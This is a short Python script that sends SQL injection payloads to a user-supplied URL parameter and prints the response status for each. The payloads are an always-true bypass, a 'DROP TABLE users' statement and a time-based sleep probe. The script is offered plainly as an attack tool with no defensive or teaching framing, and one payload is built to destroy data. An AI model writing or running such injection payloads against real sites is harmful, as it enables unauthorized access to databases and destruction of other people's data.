import requests

url = input("Target URL (e.g., http://site.com/page.php?id=): ")
payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' OR sleep(5)--"]

for payload in payloads:
    full_url = f"{url}{payload}"
    try:
        r = requests.get(full_url, timeout=10)
        print(f"[+] Payload: {payload} => Status: {r.status_code}")
    except Exception as e:
        print(f"[-] Error with payload {payload}: {e}")